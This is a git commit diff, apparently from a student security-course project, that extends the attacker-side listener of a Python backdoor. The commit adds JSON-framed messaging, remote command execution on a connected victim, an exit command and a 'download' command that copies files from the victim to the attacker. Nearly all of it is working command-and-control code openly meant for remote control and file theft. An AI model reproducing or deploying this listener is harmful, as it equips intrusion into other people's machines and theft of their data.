694749981672e36688d1dae9834417a4ef4b0622
Drilon Krasniqi <drilon.krasniqi@edu.tbz.ch>
2020-07-04 17:40:50 +0200

    Added cd command + file download

--- backdoor/listener.py
+++ backdoor/listener.py
@@ -1,7 +1,8 @@
 #!/usr/bin/env python
 
 import socket
-
+import json
+import base64
 
 class Listener:
     def __init__(self, ip, port):  # initialise the function
@@ -13,14 +14,40 @@ class Listener:
         self.connection, address = listener.accept()  # self.* convert it to an attribute, use it within the class
         print("[+] You've got a connection! " + str(address))
 
+    def reliable_send(self, data):  # Converts data into a json object
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):     # unwrap received json object
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        self.reliable_send(command)
+
+        if command[0] == "exit":    # Close connect on backdoor
+            self.connection.close()
+            exit()
+
+        return self.reliable_receive()
+
+    def write_file(self, path, content):  # Write the downloaded file into an empty file
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful."
 
     def run(self):
         while True:
             command = raw_input(">> ")  # python 3 is input instead of raw_input
-            result = self.execute_remotely(command)
+            command = command.split(" ")
+            result = self.execute_remotely(command)  # Grab content the command gives back
+            if command[0] == "download":
+                result = self.write_file(command[1], result)  # download the file
             print(result)
 
 
